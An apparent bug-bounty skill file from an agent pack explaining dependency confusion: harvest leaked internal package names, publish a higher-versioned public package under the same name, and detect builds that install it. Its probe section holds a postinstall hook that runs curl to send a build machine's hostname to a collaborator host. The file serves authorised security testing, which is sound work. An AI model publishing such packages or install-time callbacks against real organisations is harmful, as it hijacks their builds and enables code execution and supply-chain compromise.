---
skill: dependency-confusion
title: "Dependency Confusion / Substitution"
category: "Security · Web"
load_when: "dependency confusion, package confusion, namesquatting, internal package, npm private, pypi confusion, supply chain"
pack: SUPERAGENT V10
bughunt: true
---

# Dependency Confusion / Substitution

## Where it pays
Publishing a public package with the same name as a company's private one can hijack their builds → RCE in CI/dev machines. High-impact supply-chain class.

## Attack-surface signals
Leaked internal package names (in JS bundles, source maps, error logs, public repos), misconfigured package managers that prefer public registries.

## Methodology
1. Harvest internal package names (webpack bundles, package.json leaks, GitHub). 2. Check if the name is unclaimed on the public registry (npm/PyPI/RubyGems). 3. Publish a higher version with a benign beacon (install hook → OOB callback, no payload). 4. A callback from their build proves confusion.

## Payloads / probes
```
# benign PoC only
package.json name: @company/internal-utils  version: 99.0.0
postinstall: curl https://collab/?h=$(hostname)   # beacon, non-destructive
```

## Root causes
Build resolves a package from the public registry when an internal one was intended; no scope/registry pinning.

## Validation gate
Show a build/install pulling your public package (an OOB beacon from their infra) — keep it benign, no payload.

## Impact & chains
RCE in CI/dev, source/secret theft, supply-chain compromise. Chains with ci-cd.

## 🧪 Try it locally
```bash
python3 ../../../tools/skill_router.py "dependency confusion, package confusion, namesquatting, internal package, npm private, pypi confusion, supply chain"
```

→ Report with `../reporting/writeup.md` (CWE-427); validate with `../reporting/validation-gate.md`.
